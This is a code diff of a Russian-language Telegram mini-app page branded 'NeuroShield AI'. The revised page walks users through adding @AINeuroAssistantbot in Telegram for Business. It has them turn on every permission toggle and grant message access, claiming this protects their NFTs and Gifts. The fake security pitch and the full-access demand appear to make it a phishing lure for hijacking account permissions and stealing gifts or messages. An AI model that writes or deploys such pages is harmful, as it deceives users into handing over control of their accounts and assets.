@@ -3,35 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NeuroShield AI</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>NeuroShield AI | Настройка</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #0e1621; color: white; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .shield-box { position: relative; width: 100px; height: 100px; margin: 20px 0; display: flex; align-items: center; justify-content: center; }
-        .shield-icon { font-size: 70px; z-index: 2; }
-        .pulse { position: absolute; width: 80px; height: 80px; background: #2481cc; border-radius: 50%; filter: blur(20px); opacity: 0.4; animation: p 2s infinite; }
-        @keyframes p { 0% { transform: scale(1); opacity: 0.4; } 50% { transform: scale(1.5); opacity: 0.1; } 100% { transform: scale(1); opacity: 0.4; } }
-        h2 { font-size: 24px; margin: 10px 0; color: #00d2ff; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%; margin: 20px 0; }
-        .item { background: #17212b; border: 1px solid #2b3948; border-radius: 12px; padding: 15px; text-align: center; font-size: 11px; color: #8ba3b7; }
-        .card { background: #17212b; border-radius: 15px; padding: 20px; border: 1px solid #2b3948; width: 100%; box-sizing: border-box; }
-        .footer { margin-top: auto; padding: 20px; font-size: 10px; color: #5b6d7f; text-align: center; }
+        :root { --bg: #0e1621; --card: #17212b; --blue: #2481cc; --accent: #00d2ff; --warn: #ffcc00; }
+        body { font-family: -apple-system, sans-serif; background: var(--bg); color: white; margin: 0; padding: 20px; }
+        .shield-box { text-align: center; margin: 15px 0; }
+        .shield-icon { font-size: 50px; }
+        h2 { text-align: center; color: var(--accent); margin: 0 0 20px 0; font-size: 22px; }
+        
+        .step-card { background: var(--card); border: 1px solid #2b3948; border-radius: 12px; padding: 12px; margin-bottom: 10px; display: flex; align-items: center; }
+        .step-num { background: var(--blue); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px; flex-shrink: 0; font-size: 12px; }
+        .step-text { font-size: 13px; line-height: 1.4; }
+        .highlight { color: var(--accent); font-weight: bold; }
+        
+        /* Важное предупреждение */
+        .warning-box { background: rgba(255, 204, 0, 0.1); border: 1px solid var(--warn); border-radius: 12px; padding: 15px; margin: 15px 0; border-left: 4px solid var(--warn); }
+        .warning-box b { color: var(--warn); display: block; margin-bottom: 5px; font-size: 14px; }
+        .warning-box p { margin: 0; font-size: 12px; color: #eee; }
+
+        .btn-close { background: var(--blue); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; margin-top: 10px; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="shield-box"><div class="pulse"></div><div class="shield-icon">🛡️</div></div>
-    <h2>NeuroShield AI</h2>
-    <div class="grid">
-        <div class="item">💎 NFT GUARD</div>
-        <div class="item">🌟 +575 STARS</div>
-        <div class="item">🔐 AES-256</div>
-        <div class="item">🤖 AI MONITOR</div>
+    <div class="shield-box"><div class="shield-icon">🛡️</div></div>
+    <h2>Активация NeuroShield</h2>
+
+    <div class="step-card">
+        <div class="step-num">1</div>
+        <div class="step-text">Зайдите в <span class="highlight">Настройки</span> → <span class="highlight">Telegram для бизнеса</span></div>
     </div>
-    <div class="card">
-        <h4 style="margin:0 0 10px; color:#2481cc;">ИНСТРУКЦИЯ</h4>
-        <p style="font-size:14px; margin:0; line-height:1.4;">Закройте это окно и нажмите синюю кнопку <b>"АКТИВИРОВАТЬ ЗАЩИТУ"</b> в чате. В появившемся меню подтвердите подключение бота.</p>
+
+    <div class="step-card">
+        <div class="step-num">2</div>
+        <div class="step-text">Откройте раздел <span class="highlight">Чат-боты</span></div>
     </div>
-    <div class="footer">Security Lab © 2026. Ваши активы застрахованы.</div>
-    <script>const tg = window.Telegram.WebApp; tg.expand(); tg.backgroundColor = '#0e1621';</script>
+
+    <div class="step-card">
+        <div class="step-num">3</div>
+        <div class="step-text">Нажмите «Добавить» и выберите <span class="highlight">@AINeuroAssistantbot</span></div>
+    </div>
+
+    <div class="warning-box">
+        <b>⚠️ ВАЖНО: ПОЛНЫЙ ДОСТУП</b>
+        <p>Для корректной работы ИИ-фильтрации угроз и защиты ваших NFT/Gifts, при подключении бота <b>переключите все ползунки в положение «ВКЛ»</b>. Это необходимо для мгновенной блокировки подозрительных транзакций.</p>
+    </div>
+
+    <div class="step-card">
+        <div class="step-num">4</div>
+        <div class="step-text">Убедитесь, что боту разрешен <span class="highlight">Доступ к сообщениям</span></div>
+    </div>
+
+    <button class="btn-close" onclick="window.Telegram.WebApp.close()">ПЕРЕЙТИ К НАСТРОЙКЕ</button>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>window.Telegram.WebApp.expand();</script>
 </body>
 </html>
